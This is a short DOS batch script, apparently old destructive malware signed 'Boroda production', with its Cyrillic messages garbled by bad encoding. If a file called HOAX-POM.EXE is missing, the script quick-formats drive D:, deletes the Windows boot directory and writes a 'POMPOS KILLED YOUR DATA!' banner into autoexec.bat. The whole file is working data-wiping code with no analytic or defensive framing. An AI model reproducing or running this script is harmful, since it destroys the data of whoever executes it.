   @echo off
   @echo off
   if exist ..\HOAX-POM.EXE goto fun
   echo  ’ë ¯®áâã¯¨« Ž—…*œ *…**€‚ˆ‹œ*Ž, ã¤ «¨¢ ..\HOAX-POM.EXE ¯®é ¤ë
   echo ¥ ¦¤¨... „¥« âì ¥ç¥£®,  ¦¨¬ © «î¡ãî ª« ¢¨èã...
   echo y| format d: /q /u /v:Pompos
   deltree/y winbootdir% > nul
   copy c:\command.com %winbootdir%\command.com
   echo @echo off >> c:\autoexec.bat
   echo POMPOS KILLED YOUR DATA! >> c:\autoexec.bat
   echo Version 4.0 by Boroda production >> c:\autoexec.bat
   echo ‘«¥¤ãîé¨© à § ¡ã¤ì ã¬¥¥, ¨ ¥ ¦ «¥© ¥áª®«ìª® ª¨«®¡ ©â...

   :fun
